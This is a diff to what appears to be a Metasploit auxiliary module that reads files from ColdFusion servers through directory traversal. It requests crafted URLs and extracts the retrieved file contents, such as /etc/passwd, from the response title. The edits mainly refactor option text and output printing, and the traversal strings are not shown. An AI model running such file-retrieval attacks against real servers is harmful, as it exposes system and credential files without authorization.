@@ -49,8 +49,8 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
-				OptString.new('FILE', [ false,  'File to retrieve (make sure path/file match OS (ie, /etc/passwd on Windows == dumb))', '']),
-				OptBool.new('FINGERPRINT', [true, 'Only fingerprint endpoints', false]),
+				OptString.new('FILE', [ false,  'File to retrieve', '']),
+				OptBool.new('FINGERPRINT', [true, 'Only fingerprint endpoints', false])
 			], self.class)
 	end
 
@@ -115,7 +115,8 @@ class Metasploit3 < Msf::Auxiliary
 					'method' => 'GET',
 					'Connection' => "keep-alive",
 					'Accept-Encoding' => "zip,deflate",
-					}, 10)
+					})
+
 			return if not res or not res.body or not res.code
 
 			if (res.code.to_i == 200)
@@ -172,30 +173,25 @@ class Metasploit3 < Msf::Auxiliary
 						'Connection' => "keep-alive",
 						'Accept-Encoding' => "zip,deflate",
 					},
-				}, -1)
+				})
 
 
 			if (res.nil?)
 				print_error("no response for #{ip}:#{rport} #{url}")
 			elsif (res.code == 200)
 				#print_error("#{res.body}")#debug
-				out << "URL: #{ip}#{url}#{locale}#{trav}\n"
-				if match = res.body.match(/\<title\>(.*)\<\/title\>/im)
+				print_status("URL: #{ip}#{url}#{locale}#{trav}")
+				if res.body.match(/\<title\>(.*)\<\/title\>/im)
 					fileout = $1
 					if(fileout !~ /Login$/ and fileout !~ /^Welcome to ColdFusion/ and fileout !~ /^Archives and Deployment/)
-						out << "#{ip} FILE:\n#{fileout}\r\n"
-						break 
+						print_good("#{ip} FILE: #{fileout}")
+						break
 					end
 				end
 			else
 				next if (res.code == 500 or res.code == 404 or res.code == 302)
 				print_error("#{ip} #{res.inspect}")
 			end
-		end
-		if(out =~ /FILE/) 
-			print_good(out)
-		else
-			print_status(out)
 		end
 
 	rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::ArgumentError
